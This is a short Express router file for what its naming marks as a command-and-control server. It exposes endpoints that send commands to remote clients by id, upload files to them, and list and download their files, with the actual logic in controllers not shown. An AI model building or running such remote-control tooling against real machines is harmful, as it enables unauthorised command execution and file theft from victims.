
import { Router } from "express"; 
import  { send_cmd, upload_file, getFiles, downloadFiles }  from "../controllers/c2c_controller.mjs";
import multer from "multer";


const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const cmd_router = (clients) => {
    const router = Router();

    router.post('/:id', (req,res) => send_cmd(clients,req,res));
    router.post('/upload/:id', upload.single("file"), (req,res) => upload_file(clients,req,res));
    router.get('/get_files/:id', (req,res) => getFiles(clients,req,res));
    router.get('/download/:id', (req,res) => downloadFiles(clients,req,res));

    return router;
};

export default cmd_router

